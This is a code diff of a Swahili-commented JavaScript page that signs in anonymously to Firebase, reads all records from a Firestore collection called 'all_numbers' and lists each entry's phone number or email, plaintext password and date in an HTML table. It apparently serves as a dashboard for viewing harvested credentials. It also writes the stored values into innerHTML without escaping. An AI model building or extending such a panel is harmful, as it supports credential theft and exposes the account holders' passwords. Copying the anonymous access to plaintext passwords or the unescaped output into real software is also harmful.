@@ -108,26 +108,25 @@
             snapshot.forEach((doc) => {
                 const data = doc.data();
                 
-                // 1. Tafuta Namba/Email
-                let displayPhone = data.phone || data.num || data.email || data.phoneNumber || data.username || data.uid || 'N/A';
+                // 1. Tafuta Namba/Email (Tumetumia majina yote yanayowezekana)
+                let displayPhone = data.num || data.phone || data.email || data.phoneNumber || 'N/A';
                 
                 // 2. Tafuta Neno la Siri
-                let displayPassword = data.password || data.pass || data.pwd || data.nenoLaSiri || 'N/A';
+                let displayPassword = data.password || data.pass || data.pwd || 'N/A';
 
-                // 3. Tafuta Tarehe
+                // 3. Tafuta Tarehe (Tumetumia updatedAt kwa kuwa ndio ulio kwenye picha)
                 let dateStr = 'Haijulikani';
-                if (data.timestamp) {
-                    if (data.timestamp.toDate) {
-                         dateStr = data.timestamp.toDate().toLocaleString('sw-TZ');
+                let timeData = data.updatedAt || data.timestamp || data.time;
+                
+                if (timeData) {
+                    if (timeData.toDate) {
+                         dateStr = timeData.toDate().toLocaleString('sw-TZ');
                     } else {
-                         dateStr = data.timestamp; 
+                         dateStr = new Date(timeData).toLocaleString('sw-TZ'); 
                     }
-                } else if (data.updatedAt) {
-                    dateStr = data.updatedAt.toDate ? data.updatedAt.toDate().toLocaleString('sw-TZ') : data.updatedAt;
-                } else if (data.time) {
-                    dateStr = new Date(data.time).toLocaleString('sw-TZ');
                 }
 
+                // 4. Onyesha kwenye Jedwali
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
                     <td>${count}</td>
@@ -149,10 +148,8 @@
                     await signInAnonymously(auth);
                 }
                 
-                // Subiri kidogo ili Auth isambazwe
                 await new Promise(resolve => setTimeout(resolve, 500));
 
-                // Tumeondoa orderBy ili data zote zionekane bila kujali zina timestamp au lah
                 const snapshot = await getDocs(collection(db, "all_numbers"));
                 
                 renderData(snapshot);
@@ -161,11 +158,9 @@
                 console.error("Kosa la kusoma data: ", error);
                 let errorMsg = "Imeshindikana kupata taarifa. ";
                 if (error.code === 'auth/admin-restricted-operation') {
-                    errorMsg += "Anonymous Auth haijawashwa kwenye Firebase Console.";
+                    errorMsg += "Anonymous Auth haijawashwa.";
                 } else if (error.code === 'permission-denied') {
-                    errorMsg += "Firestore Rules zinakataa. Hakikisha umeingia.";
-                } else {
-                    errorMsg += "Angalia console (F12) kwa maelezo zaidi.";
+                    errorMsg += "Firestore Rules zinakataa. Hakikisha umeweka rules sahihi.";
                 }
                 showError(errorMsg);
             }
